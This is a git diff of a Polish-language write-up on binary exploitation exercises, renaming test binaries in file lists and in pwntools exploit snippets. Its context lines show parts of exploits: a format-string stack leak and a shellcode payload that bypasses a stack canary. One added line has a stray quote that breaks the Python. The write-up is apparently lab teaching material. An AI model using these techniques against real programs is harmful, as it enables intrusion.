@@ -63,7 +63,7 @@ Brak różnic w przypadku tej metody ochorny aplikacji.
 ---------
 PLIKI:
 1. `vuln-1.c`
-2. `vuln-1`
+2. `vuln-1.o`
 3. `exploit-1.py`
 ------------
 
@@ -105,7 +105,7 @@ Plik skompilowany w taki sposób jesteśmy w stanie exploitować za pomocą taki
 
 PLIKI:
 1. `vuln-1.c`
-2. `vuln-2`
+2. `vuln-2.o`
 3. `exploit-2.py`
 -------------
 
@@ -122,7 +122,7 @@ Sytuacja zmienia się jednak, gdy zastosujemy stack canary. Wówczac ataki wymie
 
 PLIKI:
 1. `vuln-2.c`
-2. `vuln-3`
+2. `vuln-3.o`
 3. `exploit-3.py`
 -------------
 
@@ -179,7 +179,7 @@ Pierwszą rzeczą jaką wykonałem to sprawdzenie co znajduje się na stosie. U�
 ```python
 from pwn import *
 
-p = process('./vuln-protected-2')
+p = process('./vuln-3.o')
 p.writeline("%p " * 199)
 data = p.readline()
 data = data.split(b" ")
@@ -257,7 +257,7 @@ Kod exploitu znajduje się poniżej.
 
 from pwn import *
 
-p = process('./vuln-protected-2')
+p = process('./vuln-3.o')'
 
 p.writeline("%p " * 199)
 
@@ -293,8 +293,6 @@ send = shellcode + b"A"* (buffer_len - len(shellcode)) + p32(canary) + b"BBBBCCC
 p.sendline(send)
 p.interactive()
 ```
-
-
 
 
 
